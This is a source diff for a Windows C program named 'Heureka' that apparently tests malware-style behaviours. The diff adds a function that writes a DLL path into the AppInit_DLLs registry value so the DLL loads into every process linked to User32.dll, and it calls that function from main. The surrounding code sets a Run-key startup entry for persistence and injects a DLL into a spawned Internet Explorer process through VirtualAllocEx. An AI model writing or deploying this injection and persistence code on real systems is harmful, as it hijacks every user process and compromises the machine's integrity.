@@ -17,6 +17,40 @@ void print_error(const char *status){
 }
 
 // test functions
+#if DLL_INJECT_REGISTRY==1
+/*
+DLLs listed under the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs 
+will be loaded into every process that links to User32.dll when that DLL attaches itself to the process.
+Needs Administrative privileges!
+*/
+void dll_inject_registry(){
+	HKEY hk;
+	DWORD dwDisp;
+
+	print_status("dll_inject_registry starts");
+	
+	if (DWORD err=RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hk, &dwDisp)){
+		print_error("Could not create the AppInitDLL registry key.");
+		return;
+	}
+	print_status("Successfully created handle to the AppInitDLL registry key.");
+	
+	if (RegSetValueEx(hk,       // subkey handle 
+			"AppInit_DLLs",			// value name 
+			0,                  // must be zero 
+			REG_SZ,      // value type 
+			(LPBYTE) HEUREKADLL_PATH,	// pointer to value data 
+			(DWORD) (strlen(HEUREKADLL_PATH)+1))) // data size
+	{
+		print_error("Could not set AppInitDLL entry value."); 
+	}else{
+		print_status("Successfully set AppInitDLL entry value."); 
+	}
+	RegCloseKey(hk); 
+	print_status("dll_inject_registry ends");
+
+}
+#endif
 
 #if SET_STARTUP_REGISTRY==1
 void set_startup_registry(){
@@ -32,6 +66,8 @@ void set_startup_registry(){
 		print_error("Could not create the registry key.");
 		return;
 	}
+	print_status("Successfully crated handle to registry key");
+
 	if (RegSetValueEx(hk,       // subkey handle 
 			"Heureka",			// value name 
 			0,                  // must be zero 
@@ -39,7 +75,9 @@ void set_startup_registry(){
 			(LPBYTE) mypath,	// pointer to value data 
 			(DWORD) (strlen(mypath)+1))) // data size
 	{
-      print_error("Could not set startup value."); 
+		print_error("Could not set startup entry value."); 
+	}else{
+		print_error("Successfully set startup entry value."); 
 	}
 	RegCloseKey(hk); 
 	print_status("set_startup_registry ends");
@@ -78,9 +116,7 @@ void dll_inject_ie(){
     {
         print_error( "CreateProcess failed (IE)");
         return;
-    }
-
-	
+    }	
 	print_status("IE process created");
 
 	void* pLibRemote=VirtualAllocEx(pi.hProcess, NULL, sizeof(HEUREKADLL_PATH),MEM_COMMIT, PAGE_READWRITE );
@@ -192,6 +228,11 @@ int main(int argc,char **argv){
 	#if SET_STARTUP_REGISTRY==1
 	set_startup_registry();
 	#endif
+
+	#if DLL_INJECT_REGISTRY==1
+	dll_inject_registry();
+	#endif
+
 	// clean up and exit
 	return 1;
 }
